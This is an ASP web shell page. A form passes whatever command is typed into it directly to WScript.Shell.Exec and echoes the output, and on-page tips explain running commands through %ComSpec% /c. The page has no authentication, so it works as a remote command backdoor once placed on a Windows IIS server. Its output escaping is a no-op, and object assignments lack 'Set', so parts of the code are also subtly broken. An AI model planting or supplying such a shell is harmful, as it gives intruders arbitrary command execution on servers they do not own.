<%
Server.ScriptTimeout = 180
Dim wshell, intReturn, strPResult, objCmd, cmd
if Request.Form("submit") <> "" then
   cmd = Request.Form("cmd")
   Response.Write("Running command: " & cmd & "<br />")
   wshell = CreateObject("WScript.Shell")
   objCmd = wShell.Exec(cmd)
   strPResult = objCmd.StdOut.Readall()
   response.write("<br><pre>" & replace(replace(strPResult,"<","<"),vbCrLf,"<br>") & "</pre>")
   wshell = nothing
end if

%>
<html>
<head><title></title></head>
<body onload="document.shell.cmd.focus()">
<form method="POST" name="shell">
Command: <Input width="200" type="text" name="cmd" value="<%=cmd%>" /><br />
<input type="submit" name="submit" value="Submit" />
<p>Don't forget that if you want to shell command (not a specific executable) you need to call cmd.exe. It is usually located at C:\Windows\System32\cmd.exe, but to be safe just call %ComSpec%. Also, don't forget to use the /c switch so cmd.exe terminates when your command is done.
<p>Example command to do a directory listing:<br>
%ComSpec% /c dir
</form>
</body>
</html>
